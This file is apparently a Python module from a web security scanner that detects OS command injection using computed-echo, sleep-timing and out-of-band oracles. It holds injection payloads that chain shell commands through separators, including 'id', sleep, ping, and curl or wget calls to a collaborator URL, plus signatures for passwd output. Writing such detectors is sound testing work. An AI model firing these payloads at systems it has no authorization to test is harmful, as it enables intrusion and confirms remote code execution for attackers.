"""
OS command-injection detection — computed-output, time, and OOB oracles.

A native complement to the shell-injection templates in nuclei. Three confirmed
signals, none of them destructive:

  1. Computed output: inject `echo cmi$((A*B))` across separators (; | & `` $()
     newline). The response is a hit only when it contains the PRODUCT (e.g.
     cmi260599) — which is NOT present in the payload, so an app that merely
     echoes the injected string back cannot false-positive; only real execution
     computes it. Also detects `id` / passwd output.

  2. Time-based blind: `; sleep N` (and Windows `ping -n`) with a `sleep 0`
     control; confirmed only when the delayed request is slower than the control
     by ~N seconds (rules out jitter).

  3. OOB: a `curl`/`wget` to the native collaborator confirms blind command
     execution via the server-side callback (reuses collaborator.py).

Pure/deterministic and unit-tested; tools._run_cmdi does the transport + timing.
"""
from __future__ import annotations

import re

MARKER = "cmi"
_A, _B = 421, 619
EXPECTED = f"{MARKER}{_A * _B}"          # cmi260599 — appears only if the echo executed

_OUTPUT_SIGS = [
    re.compile(r"uid=\d+\([^)]+\)\s+gid=\d+"),      # id
    re.compile(r"root:.*?:0:0:", re.M),             # /etc/passwd
]


def output_payloads(value: str) -> list:
    v = value or ""
    calc = f"{MARKER}$(( {_A} * {_B} ))"
    return [
        {"payload": f"{v}; echo {calc}"},
        {"payload": f"{v} | echo {calc}"},
        {"payload": f"{v}& echo {calc}"},
        {"payload": f"{v}`echo {calc}`"},
        {"payload": f"{v}$(echo {calc})"},
        {"payload": f"{v}%0aecho {calc}"},
        {"payload": f"{v}; id"},
    ]


def analyze_output(baseline: str, probe: str) -> dict | None:
    """Hit only on evidence of execution (the computed product or id/passwd),
    never on the echoed payload — EXPECTED is absent from every payload above."""
    base, body = baseline or "", probe or ""
    if EXPECTED in body and EXPECTED not in base:
        return {"kind": "computed-echo", "match": EXPECTED}
    for rx in _OUTPUT_SIGS:
        m = rx.search(body)
        if m and not rx.search(base):
            return {"kind": "command-output", "match": m.group(0)[:60]}
    return None


def time_payloads(value: str, seconds: int) -> list:
    v = value or ""
    return [
        {"payload": f"{v}; sleep {seconds}", "control": f"{v}; sleep 0"},
        {"payload": f"{v}| sleep {seconds}", "control": f"{v}| sleep 0"},
        {"payload": f"{v}& sleep {seconds}", "control": f"{v}& sleep 0"},
        {"payload": f"{v}`sleep {seconds}`", "control": f"{v}`sleep 0`"},
        {"payload": f"{v}$(sleep {seconds})", "control": f"{v}$(sleep 0)"},
        {"payload": f"{v}%0asleep {seconds}", "control": f"{v}%0asleep 0"},
        {"payload": f"{v}& ping -n {seconds + 1} 127.0.0.1", "control": f"{v}& ping -n 1 127.0.0.1"},
    ]


def analyze_time(control_elapsed: float, sleep_elapsed: float, seconds: int, margin: float = 0.6) -> bool:
    need = seconds * margin
    return sleep_elapsed - control_elapsed >= need and sleep_elapsed >= need


def oob_payloads(value: str, collab_url: str) -> list:
    v = value or ""
    return [
        f"{v}; curl -s {collab_url}",
        f"{v}| curl -s {collab_url}",
        f"{v}`curl -s {collab_url}`",
        f"{v}$(curl -s {collab_url})",
        f"{v}; wget -q -O- {collab_url}",
    ]


# ── finding builders ─────────────────────────────────────────────
def _base(url: str, param: str, oracle: str, sev: str, desc: str, evidence: str, steps: list) -> dict:
    return {
        "title": f"OS command injection ({oracle}) in '{param}'", "severity": sev, "target": url,
        "description": desc,
        "impact": "Execute arbitrary OS commands on the server: full host compromise, data theft, lateral movement.",
        "reproduction_steps": steps, "evidence": evidence, "cwe": "CWE-78",
        "family": "cmdi", "tags": ["cmdi", "rce", oracle], "confidence": "confirmed",
    }


def output_finding(url: str, param: str, payload: str, hit: dict) -> dict:
    return _base(url, param, "output", "critical",
                 (f"Injecting {payload!r} into '{param}' produced command output ({hit['kind']}: {hit['match']}) that "
                  "the injected string itself does not contain — the OS command executed."),
                 f"{hit['kind']}: {hit['match']}",
                 [f"Set '{param}' to {payload!r}",
                  f"Observe the executed-command output ({hit['match']}) in the response",
                  "Escalate to a reverse shell only under explicit authorization"])


def time_finding(url: str, param: str, item: dict, control_elapsed: float, sleep_elapsed: float, seconds: int) -> dict:
    return _base(url, param, "time-blind", "critical",
                 (f"For '{param}', {item['payload']!r} delayed the response to {sleep_elapsed:.1f}s vs "
                  f"{control_elapsed:.1f}s for the sleep-0 control (~{seconds}s injected). A shell command executed "
                  "(blind command injection)."),
                 f"{sleep_elapsed:.1f}s vs control {control_elapsed:.1f}s (injected {seconds}s)",
                 [f"Set '{param}' to {item['payload']!r}",
                  f"Observe the response takes ~{seconds}s longer than the sleep-0 control",
                  "Confirm with an OOB payload or output-based command"])


def oob_finding(url: str, param: str, probe: str, interactions: list) -> dict:
    src = (interactions[0] if interactions else {}).get("source_ip", "?")
    return _base(url, param, "oob", "critical",
                 (f"An injected `curl`/`wget` to the collaborator ({probe}) triggered a server-side request from "
                  f"{src}. Nothing was reflected, so this is blind command injection proven by the callback."),
                 f"OOB interaction from {src} on {probe}",
                 [f"Set '{param}' to a payload running curl {probe}",
                  f"Observe the inbound interaction at the collaborator from {src}",
                  "Escalate to full command execution only under explicit authorization"])
